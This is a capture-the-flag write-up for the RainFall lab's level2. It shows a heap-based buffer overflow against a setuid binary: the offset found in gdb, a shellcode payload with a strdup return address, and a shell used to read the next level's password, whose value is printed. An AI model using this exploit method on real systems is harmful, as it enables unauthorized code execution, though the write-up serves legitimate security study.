level2
======

*	We spawn with a [level2](source/level2) executable
	```console
	level2@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
	level2@RainFall:~$ ./level2 
	test
	test
	```
*	Let's take a look at the code
	```console
	root@DESKTOP-69N2SL4:~# scp -P 4242 level2@192.168.29.4:~/level2 .
	root@DESKTOP-69N2SL4:~/42/Ghub/Rainfall/level2/source# ./getFunctions.sh 
	Executable files in the current directory:
	[1] ./level2
	Enter the number of the executable file you want to analyze: 1
	```
*	My script created the [disas.s](source/disas.s) file which will make understanding this code a bit easier. We can see the main function calls the `p` one. This function uses `gets` which we now know is notorious for causing buffer overflow vulnerabilities. We can also see `strdup` and `printf`
*	But of course it won't happen again so this time it seems that there is `cmp` to make sure we don't overwrite the return address
	```assembly
	and    $0xb0000000,%eax
	cmp    $0xb0000000,%eax
	```
	Basically, it restrict anything that starts with `0xb` to make sure we don't use the stack
*	We are in luck since this program also uses `strdup` (which is also known for buffer overflow attacks). We might be able to use the heap !
	```assembly
	call   80483e0 <strdup@plt>
	```
*	Ok first, let's find the offset 
	```gdb
	(gdb) r
	Starting program: /home/user/level2/level2 
	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

	Program received signal SIGSEGV, Segmentation fault.
	0x37634136 in ?? ()
	```
	I am using the same [website](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) than level1 and the offset is `80`
*	We also need a shell code to launch `/bin/sh` and we can find one [here](http://shell-storm.org/shellcode/index.html)
*	The one we are looking for is [this one](http://shell-storm.org/shellcode/files/shellcode-575.html).
*	Unlike stack-based buffer overflows, where the return address is typically located nearby the buffer being overflowed, in heap-based overflows, the return address might not be directly overwritten. So we have to find the return address
	```console
	level2@RainFall:~$ ltrace ./level2 
	__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
	fflush(0xb7fd1a20)                                               = 0
	gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)                    = 0xbffff6fc
	puts("")                                                         = 1
	strdup("")                                                       = 0x0804a008
	+++ exited (status 8) +++
	```
*	Let's see what we need to put in our exploit:
	*	shellcode : 21 bytes
	*	return address : 4 bytes (`\x08\xa0\x04\x08` little endian rule)
	*	data left to fill : 80 - 21 = 59 bytes
*	We should have all we need to exploit the program:
	```console
	python -c 'print "shellcode" + "q" * 59 + "\x08\xa0\x04\x08"' > /tmp/payload
	level2@RainFall:~$ cat /tmp/payload - | ./level2 
	j
	X�Rh//shh/bin��1�̀qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq�
	whoami
	level3
	cat /home/user/level3/.pass
	492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
	```
	I replaced `shellcode` to make it more readable